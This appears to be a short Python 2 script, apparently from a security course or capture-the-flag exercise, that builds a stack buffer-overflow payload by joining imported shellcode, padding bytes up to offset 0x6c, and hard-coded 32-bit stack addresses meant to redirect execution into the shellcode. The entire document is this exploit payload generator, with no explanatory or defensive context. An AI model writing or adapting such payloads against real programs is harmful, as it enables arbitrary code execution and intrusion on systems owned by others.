from shellcode import shellcode
print shellcode+"Z"*(int(0x6c)-len(shellcode))+"\x18"+"\x81"+"\xfe"+"\xbf"+"\x8c"+"\x80"+"\xfe"+"\xbf"